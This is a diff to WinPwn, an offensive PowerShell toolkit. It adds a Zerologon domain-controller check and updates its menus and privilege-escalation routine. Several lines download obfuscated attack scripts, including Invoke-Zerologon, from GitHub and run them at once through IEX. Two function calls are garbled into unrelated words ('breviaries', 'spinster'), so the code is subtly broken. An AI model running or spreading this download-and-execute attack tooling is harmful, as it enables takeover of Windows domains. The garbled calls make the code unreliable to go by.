@@ -1731,7 +1731,7 @@ function Passhunt
         if ($domain)
         {
             Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
-            $ActiveServers = Get-DomainComputer -Ping -OperatingSystem "Windows Server*"
+            $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
             $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"
 
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewobfs.ps1')
@@ -1834,6 +1834,7 @@ __        ___       ____
         shareenumeration
         powerSQL -noninteractive
         MS17-10 -noninteractive
+        zerologon -noninteractive
         passhunt -domain $true
         GPOAudit
         spoolvulnscan -noninteractive
@@ -1851,6 +1852,7 @@ __        ___       ____
         shareenumeration -consoleoutput
         powerSQL -noninteractive -consoleoutput
         MS17-10 -noninteractive -consoleoutput
+        zerologon -noninteractive -consoleoutput
         spoolvulnscan -noninteractive -consoleoutput
         bluekeep -noninteractive -consoleoutput
         printercheck -noninteractive -consoleoutput
@@ -1881,7 +1883,8 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '16. Search for printers / potential vulns! '
 	Write-Host -ForegroundColor Green '17. Search for Resource-Based Constrained Delegation attack paths! '
 	Write-Host -ForegroundColor Green '18. Enumerate remote access policies through group policy! '
-        Write-Host -ForegroundColor Green '19. Exit. '
+        Write-Host -ForegroundColor Green '19. Check all DCs for zerologon vulnerability! '
+        Write-Host -ForegroundColor Green '20. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1905,9 +1908,10 @@ __        ___       ____
 	     16{printercheck}
 	     17{RBCD-Check}
 	     18{GPORemoteAccessPolicy}
+         19{zerologon}
        }
     }
- While ($masterquestion -ne 19)
+ While ($masterquestion -ne 20)
 }
 
 function generaldomaininfo{
@@ -2435,6 +2439,54 @@ function Bluekeep
 
 }
 
+function zerologon
+{
+<#
+        .DESCRIPTION
+        Search in AD for Zerologon vulnerable DCs
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')         
+	Write-Host -ForegroundColor Yellow 'Searching for zerologon vulnerable Domain Controllers - if vulnerable you can pwn everything in 5 minutes.' 
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Zerologon.ps1')
+    $domcontrols = spinster
+        
+        
+    foreach ($domc in $domcontrols.name)
+    {
+        if(!$consoleoutput){$domc > "$currentPath\DomainRecon\DC-FQDN.txt"}
+	 	try{
+
+
+                $Results = Invoke-Zerologon -fqdn $domc
+
+                if (!($Results -eq $null))
+                {
+                    Write-Host "Found vulnerable DC: " 
+                    $domc
+                    if(!$consoleoutput){$domc > "$currentPath\Vulnerabilities\ZerologonvulnerableDC.txt"}
+
+                }
+	       }
+           catch
+           {
+                Write-Host "Got an error"
+           }
+    }
+
+}
+
 function MS17-10
 {
 <#
@@ -2705,18 +2757,17 @@ function itm4nprivesc
     # Stolen and obfuscated from https://github.com/itm4n/PrivescCheck
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/IkeextCheck.ps1')
+    
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Privesc.ps1')
-    if(!$consoleoutput){
-        Invoke-IkeextCheck >> "$currentPath\Vulnerabilities\IkeExtVulnerable.txt"
-        Invoke-PrivescCheck >> "$currentPath\LocalPrivEsc\PrivescCheck.txt"
+    if(!$consoleoutput)
+    {
+        Invoke-PrivescCheck -Extended -Report PrivescCheck -Format CSV,HTML,TXT
+        Move-Item $currentPath\PrivescCheck* "$currentPath\LocalPrivEsc\"
     }
     else
     {
-        Write-Host -ForegroundColor Yellow '-------> Ikeext Check'
-        Invoke-IkeextCheck
         Write-Host -ForegroundColor Yellow '-------> Invoke-Privesc Checks'
-        Invoke-PrivescCheck
+        Invoke-PrivescCheck -Extended
     }
 }
 
